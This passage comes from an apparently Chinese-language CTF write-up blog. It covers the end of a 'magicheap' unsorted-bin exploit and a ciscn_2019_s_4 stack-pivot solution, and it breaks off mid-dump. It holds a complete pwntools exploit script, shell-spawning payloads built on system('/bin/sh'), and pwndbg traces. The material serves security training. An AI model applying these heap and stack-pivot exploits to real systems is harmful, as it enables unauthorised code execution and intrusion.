class="line">&#125;</span><br></pre></td></tr></table></figure><p>edit的时候输入的长度任意，写fd和bk为magic的地址，放入unsorted bin中，然后即可get shell</p><p>Exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">magic = <span class="number">0x6020A0</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = remote(&quot;node4.buuoj.cn&quot;,28141)</span></span><br><span class="line">io = process(<span class="string">&quot;./magicheap&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CreateHeap</span>(<span class="params">size,content</span>):</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Size of Heap : &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Content of heap:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">EditHeap</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Size of Heap : &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Content of heap : &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DeleteHeap</span>(<span class="params">idx</span>):</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CreateHeap(<span class="number">0x10</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">CreateHeap(<span class="number">0x50</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0x50</span>)</span><br><span class="line">CreateHeap(<span class="number">0x10</span>,<span class="string">&quot;c&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">DeleteHeap(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+ p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>) + p64(magic-<span class="number">0x10</span>)+ p64(magic-<span class="number">0x10</span>)</span><br><span class="line">EditHeap(<span class="number">0</span>,<span class="number">0x30</span>,payload)</span><br><span class="line">CreateHeap(<span class="number">0x50</span>,<span class="string">&#x27;eeee&#x27;</span>*<span class="number">0x1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;4869&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x3A-ciscn-2019-s-4"><a href="#0x3A-ciscn-2019-s-4" class="headerlink" title="0x3A.ciscn_2019_s_4"></a>0x3A.ciscn_2019_s_4</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ checksec ciscn_s_4 </span><br><span class="line">[*] &#x27;/home/gwt/Desktop/ciscn_s_4&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">gwt@ubuntu:~/Desktop$ </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome, my friend. What&#x27;s your name?&quot;</span>);</span><br><span class="line">  vul();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//还有个后门函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hack</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题输入的定长只有0x30，只能溢出8字节，所以不能ret2libc。</p><p>vuln是以leave ret结尾的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">.text:08048595</span><br><span class="line">.text:08048595 ; __unwind &#123;</span><br><span class="line">.text:08048595                 push    ebp</span><br><span class="line">.text:08048596                 mov     ebp, esp</span><br><span class="line">.text:08048598                 sub     esp, 28h</span><br><span class="line">.text:0804859B                 sub     esp, 4</span><br><span class="line">.text:0804859E                 push    20h ; &#x27; &#x27;       ; n</span><br><span class="line">.text:080485A0                 push    0               ; c</span><br><span class="line">.text:080485A2                 lea     eax, [ebp+s]</span><br><span class="line">.text:080485A5                 push    eax             ; s</span><br><span class="line">.text:080485A6                 call    _memset</span><br><span class="line">.text:080485AB                 add     esp, 10h</span><br><span class="line">.text:080485AE                 sub     esp, 4</span><br><span class="line">.text:080485B1                 push    30h ; &#x27;0&#x27;       ; nbytes</span><br><span class="line">.text:080485B3                 lea     eax, [ebp+s]</span><br><span class="line">.text:080485B6                 push    eax             ; buf</span><br><span class="line">.text:080485B7                 push    0               ; fd</span><br><span class="line">.text:080485B9                 call    _read</span><br><span class="line">.text:080485BE                 add     esp, 10h</span><br><span class="line">.text:080485C1                 sub     esp, 8</span><br><span class="line">.text:080485C4                 lea     eax, [ebp+s]</span><br><span class="line">.text:080485C7                 push    eax</span><br><span class="line">.text:080485C8                 push    offset format   ; &quot;Hello, %s\n&quot;</span><br><span class="line">.text:080485CD                 call    _printf</span><br><span class="line">.text:080485D2                 add     esp, 10h</span><br><span class="line">.text:080485D5                 sub     esp, 4</span><br><span class="line">.text:080485D8                 push    30h ; &#x27;0&#x27;       ; nbytes</span><br><span class="line">.text:080485DA                 lea     eax, [ebp+s]</span><br><span class="line">.text:080485DD                 push    eax             ; buf</span><br><span class="line">.text:080485DE                 push    0               ; fd</span><br><span class="line">.text:080485E0                 call    _read</span><br><span class="line">.text:080485E5                 add     esp, 10h</span><br><span class="line">.text:080485E8                 sub     esp, 8</span><br><span class="line">.text:080485EB                 lea     eax, [ebp+s]</span><br><span class="line">.text:080485EE                 push    eax</span><br><span class="line">.text:080485EF                 push    offset format   ; &quot;Hello, %s\n&quot;</span><br><span class="line">.text:080485F4                 call    _printf</span><br><span class="line">.text:080485F9                 add     esp, 10h</span><br><span class="line">.text:080485FC                 nop</span><br><span class="line">.text:080485FD                 leave</span><br><span class="line">.text:080485FE                 retn</span><br><span class="line">.text:080485FE ; &#125; // starts at 8048595</span><br><span class="line">.text:080485FE vul             endp</span><br></pre></td></tr></table></figure><p>可以进行栈迁移。</p><blockquote><p>  假设esp =&gt; 0x1111,ebp=&gt;0x2222</p><p>  那么leave：</p><blockquote><p>  mov esp,ebp; // esp = ebp = 0x2222</p><p>  pop ebp ;// ebp = [esp]，esp = esp+4</p></blockquote></blockquote><p>输入0x20个a查看栈</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 30</span><br><span class="line">00:0000│ esp  0xffffd048 —▸ 0xffffd098 —▸ 0xffffd0a8 ◂— 0x0</span><br><span class="line">01:0004│      0xffffd04c ◂— 0x30 /* <span class="string">&#x27;0&#x27;</span> */</span><br><span class="line">02:0008│      0xffffd050 —▸ 0xffffd070 ◂— 0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">03:000c│      0xffffd054 —▸ 0xf7ed9c43 (__read_nocancel+25) ◂— pop    ebx</span><br><span class="line">04:0010│      0xffffd058 ◂— 0x0</span><br><span class="line">05:0014│      0xffffd05c —▸ 0x80485e5 (vul+80) ◂— add    esp, 0x10</span><br><span class="line">06:0018│      0xffffd060 ◂— 0x0</span><br><span class="line">07:001c│      0xffffd064 —▸ 0xffffd070 ◂— 0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">08:0020│      0xffffd068 ◂— 0x30 /* <span class="string">&#x27;0&#x27;</span> */</span><br><span class="line">09:0024│      0xffffd06c —▸ 0xf7fb7d60 (_IO_2_1_stdout_) ◂— 0xfbad2887</span><br><span class="line">0a:0028│ ecx  0xffffd070 ◂— 0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">... ↓</span><br><span class="line">12:0048│      0xffffd090 —▸ 0x80486d8 ◂— push   edi</span><br><span class="line">13:004c│      0xffffd094 —▸ 0xffffd154 —▸ 0xffffd327 ◂— <span class="string">&#x27;./ciscn_s_4&#x27;</span></span><br><span class="line">14:0050│ ebp  0xffffd098 —▸ 0xffffd0a8 ◂— 0x0</span><br><span class="line">15:0054│      0xffffd09c —▸ 0x804862a (main+43) ◂— mov    eax, 0</span><br><span class="line">16:0058│      0xffffd0a0 —▸ 0xf7fb73dc (__exit_funcs) —▸ 0xf7fb81e0 (initial) ◂— 0x0</span><br><span class="line">17:005c│      0xffffd0a4 —▸ 0xffffd0c0 ◂— 0x1</span><br></pre></td></tr></table></figure><p>可以看到ebp的地址是0xffffd0a8，输入的buf的地址是0xffffd070，相差0x38.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x28</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line">ebp = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(ebp)</span><br></pre></td></tr></table></figure><p>第二次构造的payload是这样：</p><p><code>payload=(p32(sys_addr)+&#39;aaaa&#39;+p32(buf+12)+&#39;/bin/sh\x00&#39;).ljust(0x28,&#39;a&#39;)+p32(buf_addr-4)+p32(leave)</code></p><p>前面的0x28是用来填充，<code>buf_addr</code>是覆写ebp的地址，leave覆写ret的地址。</p><p>所有的流程如下：</p><p><img src="/2021/07/18/BUU-PWN-0x30-0x3f/1.png" alt="1"></p><p>具体的调试情况如下：</p><p>执行源程序中的leave前：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">EAX  0x8</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xffffffff</span><br><span class="line"> EDX  0xf7fb8870 (_IO_stdfile_1_lock) ◂— 0x0</span><br><span class="line"> EDI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0</span><br><span class="line"> ESI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0</span><br><span class="line"> EBP  0xffffd098 —▸ 0xffffd06c —▸ 0xf7fb7d60 (_IO_2_1_stdout_) ◂— 0xfbad2887</span><br><span class="line"> ESP  0xffffd070 —▸ 0x8048400 (system@plt) ◂— jmp    dword ptr [0x804a018]</span><br><span class="line"> EIP  0x80485fd (vul+104) ◂— leave  </span><br><span class="line">──────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────</span><br><span class="line">   0x80485ee &lt;vul+89&gt;                     push   eax</span><br><span class="line">   0x80485ef &lt;vul+90&gt;                     push   0x80486ca</span><br><span class="line">   0x80485f4 &lt;vul+95&gt;                     call   <span class="built_in">printf</span>@plt &lt;0x80483e0&gt;</span><br><span class="line"> </span><br><span class="line">   0x80485f9 &lt;vul+100&gt;                    add    esp, 0x10</span><br><span class="line">   0x80485fc &lt;vul+103&gt;                    nop    </span><br><span class="line"> ► 0x80485fd &lt;vul+104&gt;                    leave  </span><br><span class="line">   0x80485fe &lt;vul+105&gt;                    ret    </span><br><span class="line">    ↓</span><br><span class="line">   0x80484b8 &lt;deregister_tm_clones+40&gt;    leave  </span><br><span class="line">   0x80484b9 &lt;deregister_tm_clones+41&gt;    ret    </span><br><span class="line">    ↓</span><br><span class="line">   0x8048400 &lt;system@plt&gt;                 jmp    dword ptr [_GLOBAL_OFFSET_TABLE_+24] &lt;0x804a018&gt;</span><br><span class="line"> </span><br><span class="line">   0x8048406 &lt;system@plt+6&gt;               push   0x18</span><br><span class="line">───────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffd070 —▸ 0x8048400 (system@plt) ◂— jmp    dword ptr [0x804a018]</span><br><span class="line">01:0004│      0xffffd074 ◂— 0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">02:0008│      0xffffd078 —▸ 0xffffd07c ◂— <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">03:000c│      0xffffd07c ◂— <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">04:0010│      0xffffd080 ◂— 0x68732f /* <span class="string">&#x27;/sh&#x27;</span> */</span><br><span class="line">05:0014│      0xffffd084 ◂— 0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>执行源程序中的leave后：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> EAX  0x8</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xffffffff</span><br><span class="line"> EDX  0xf7fb8870 (_IO_stdfile_1_lock) ◂— 0x0</span><br><span class="line"> EDI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0</span><br><span class="line"> ESI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0</span><br><span class="line"> EBP  0xffffd06c —▸ 0xf7fb7d60 (_IO_2_1_stdout_) ◂— 0xfbad2887</span><br><span class="line"> ESP  0xffffd09c —▸ 0x80484b8 (deregister_tm_clones+40) ◂— leave  </span><br><span class="line"> EIP  0x80485fe (vul+105) ◂— ret    </span><br><span class="line">─────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────</span><br><span class="line">   0x80485ef &lt;vul+90&gt;                     push   0x80486ca</span><br><span class="line">   0x80485f4 &lt;vul+95&gt;                     call   printf@plt &lt;0x80483e0&gt;</span><br><span class="line"> </span><br><span class="line">   0x80485f9 &lt;vul+100&gt;                    add    esp, 0x10</span><br><span class="line">   0x80485fc &lt;vul+103&gt;                    nop    </span><br><span class="line">   0x80485fd &lt;vul+104&gt;                    leave  </span><br><span class="line"> ► 0x80485fe &lt;vul+105&gt;                    ret             &lt;0x80484b8; deregister_tm_clones+40&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x80484b8 &lt;deregister_tm_clones+40&gt;    leave  </span><br><span class="line">   0x80484b9 &lt;deregister_tm_clones+41&gt;    ret    </span><br><span class="line">    ↓</span><br><span class="line">   0x8048400 &lt;system@plt&gt;                 jmp    dword ptr [_GLOBAL_OFFSET_TABLE_+24] &lt;0x804a018&gt;</span><br><span class="line"> </span><br><span class="line">   0x8048406 &lt;system@plt+6&gt;               push   0x18</span><br><span class="line">   0x804840b &lt;system@plt+11&gt;              jmp    0x80483c0</span><br><span class="line">──────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffd09c —▸ 0x80484b8 (deregister_tm_clones+40) ◂— leave  </span><br><span class="line">01:0004│      0xffffd0a0 —▸ 0xf7fb73dc (__exit_funcs) —▸ 0xf7fb81e0 (initial) ◂— 0x0</span><br><span class="line">02:0008│      0xffffd0a4 —▸ 0xffffd0c0 ◂— 0x1</span><br><span class="line">03:000c│      0xffffd0a8 ◂— 0x0</span><br><span class="line">04:0010│      0xffffd0ac —▸ 0xf7e1c647 (__libc_start_main+247) ◂— add    esp, 0x10</span><br><span class="line">05:0014│      0xffffd0b0 —▸ 0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0</span><br><span class="line">... ↓</span><br><span class="line">07:001c│      0xffffd0b8 ◂— 0x0</span><br></pre></td></tr></table></figure><p>执行完源程序中的ret后：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"> EAX  0x8</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xffffffff</span><br><span class="line"> EDX  0xf7fb8870 (_IO_stdfile_1_lock) ◂— 0x0</span><br><span class="line"> EDI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0</span><br><span class="line"> ESI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0</span><br><span class="line"> EBP  0xffffd06c —▸ 0xf7fb7d60 (_IO_2_1_stdout_) ◂— 0xfbad2887</span><br><span class="line"> ESP  0xffffd0a0 —▸ 0xf7fb73dc (__exit_funcs) —▸ 0xf7fb81e0 (initial) ◂— 0x0</span><br><span class="line"> EIP  0x80484b8 (deregister_tm_clones+40) ◂— leave  </span><br><span class="line">─────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────</span><br><span class="line">   0x80485f4 &lt;vul+95&gt;                     call   printf@plt &lt;0x80483e0&gt;</span><br><span class="line"> </span><br><span class="line">   0x80485f9 &lt;vul+100&gt;                    add    esp, 0x10</span><br><span class="line">   0x80485fc &lt;vul+103&gt;                    nop    </span><br><span class="line">   0x80485fd &lt;vul+104&gt;                    leave  </span><br><span class="line">   0x80485fe &lt;vul+105&gt;                    ret    </span><br><span class="line">    ↓</span><br><span class="line"> ► 0x80484b8 &lt;deregister_tm_clones+40&gt;    leave  </span><br><span class="line">   0x80484b9 &lt;deregister_tm_clones+41&gt;    ret    </span><br><span class="line">    ↓</span><br><span class="line">   0x8048400 &lt;system@plt&gt;                 jmp    dword ptr [_GLOBAL_OFFSET_TABLE_+24] &lt;0x804a018&gt;</span><br><span class="line"> </span><br><span class="line">   0x8048406 &lt;system@plt+6&gt;               push   0x18</span><br><span class="line">   0x804840b &lt;system@plt+11&gt;              jmp    0x80483c0</span><br><span class="line">    ↓</span><br><span class="line">   0x80483c0                              push   dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt;</span><br><span class="line">──────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffd0a0 —▸ 0xf7fb73dc (__exit_funcs) —▸ 0xf7fb81e0 (initial) ◂— 0x0</span><br><span class="line">01:0004│      0xffffd0a4 —▸ 0xffffd0c0 ◂— 0x1</span><br><span class="line">02:0008│      0xffffd0a8 ◂— 0x0</span><br><span class="line">03:000c│      0xffffd0ac —▸ 0xf7e1c647 (__libc_start_main+247) ◂— add    esp, 0x10</span><br><span class="line">04:0010│      0xffffd0b0 —▸ 0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0</span><br><span class="line">... ↓</span><br><span class="line">06:0018│      0xffffd0b8 ◂— 0x0</span><br><span class="line">07:001c│      0xffffd0bc —▸ 0xf7e1c647 (__libc_start_main+247) ◂— add    esp, 0x10</span><br></pre></td></tr></table></figure><p>执行完构造payload中的leave后：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"> EAX  0x8</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xffffffff</span><br><span class="line"> EDX  0xf7fb8870 (_IO_stdfile_1_lock) ◂— 0x0</span><br><span class="line"> EDI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0</span><br><span class="line"> ESI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0</span><br><span class="line"> EBP  0xf7fb7d60 (_IO_2_1_stdout_) ◂— 0xfbad2887</span><br><span class="line"> ESP  0xffffd070 —▸ 0x8048400 (system@plt) ◂— jmp    dword ptr [0x804a018]</span><br><span class="line"> EIP  0x80484b9 (deregister_tm_clones+41) ◂— ret    </span><br><span class="line">─────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────</span><br><span class="line">   0x80485f9 &lt;vul+100&gt;                    add    esp, 0x10</span><br><span class="line">   0x80485fc &lt;vul+103&gt;                    nop    </span><br><span class="line">   0x80485fd &lt;vul+104&gt;                    leave  </span><br><span class="line">   0x80485fe &lt;vul+105&gt;                    ret    </span><br><span class="line">    ↓</span><br><span class="line">   0x80484b8 &lt;deregister_tm_clones+40&gt;    leave  </span><br><span class="line"> ► 0x80484b9 &lt;deregister_tm_clones+41&gt;    ret             &lt;0x8048400; system@plt&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x8048400 &lt;system@plt&gt;                 jmp    dword ptr [_GLOBAL_OFFSET_TABLE_+24] &lt;0x804a018&gt;</span><br><span class="line"> </span><br><span class="line">   0x8048406 &lt;system@plt+6&gt;               push   0x18</span><br><span class="line">   0x804840b &lt;system@plt+11&gt;              jmp    0x80483c0</span><br><span class="line">    ↓</span><br><span class="line">   0x80483c0                              push   dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt;</span><br><span class="line">   0x80483c6                              jmp    dword ptr [0x804a008] &lt;0xf7fee000&gt;</span><br><span class="line">──────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffd070 —▸ 0x8048400 (system@plt) ◂— jmp    dword ptr [0x804a018]</span><br><span class="line">01:0004│      0xffffd074 ◂— 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line">02:0008│      0xffffd078 —▸ 0xffffd07c ◂— &#x27;/bin/sh&#x27;</span><br><span class="line">03:000c│      0xffffd07c ◂— &#x27;/bin/sh&#x27;</span><br><span class="line">04:0010│      0xffffd080 ◂— 0x68732f /* &#x27;/sh&#x27; */</span><br><span class="line">05:0014│      0xffffd084 ◂— 0x61616161 (&#x27;aaaa&#x27;)</span><br></pre></td></tr></table></figure><p>执行完构造payload中的ret后：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 